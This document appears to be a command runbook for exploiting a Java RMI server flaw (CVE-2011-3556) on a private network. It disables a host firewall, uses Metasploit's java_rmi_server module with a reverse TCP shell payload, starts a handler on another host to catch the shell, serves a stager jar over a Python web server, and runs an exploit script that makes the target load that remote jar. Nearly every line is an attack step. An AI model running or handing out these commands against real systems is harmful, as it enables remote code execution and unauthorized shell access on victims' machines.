# 192.168.1.80 -- Update/upgrade Metasploit
apt-get update -y && apt-get dist-upgrade -y

# 192.168.1.71 -- Disable packet filtering
/usr/libexec/ApplicationFirewall/socketfilterfw --setblockall off

# 192.168.1.80 -- Use the exploit java/shell_reverse_tcp against the target and save the stage sniffed through the network as stager.jar.
msfconsole -q -x "use exploit/multi/misc/java_rmi_server;set payload java/shell_reverse_tcp;set rhost 192.168.1.77;set lhost 192.168.1.80;set lport 3099;run;exit -y"

# 192.168.1.80 -- Launch the Metasploit handler exploit/multi/handler on the listening host and port specified.
msfconsole -q -x "use exploit/multi/handler;set payload java/shell_reverse_tcp;set lhost 192.168.1.80;set lport 3099;run"

# 192.168.1.71 -- Launch the webserver that serves the stager and payload.
python3 -m http.server --bind 192.168.1.71 2099

# 192.168.1.71 -- Launch the exploit using the URI pointing to stager.jar.
./CVE-2011-3556.py --host 192.168.1.77 --uri http://192.168.1.71:2099/stage.jar --logging=DEBUG

# 192.168.1.80 -- Wait for a connection on the handler.
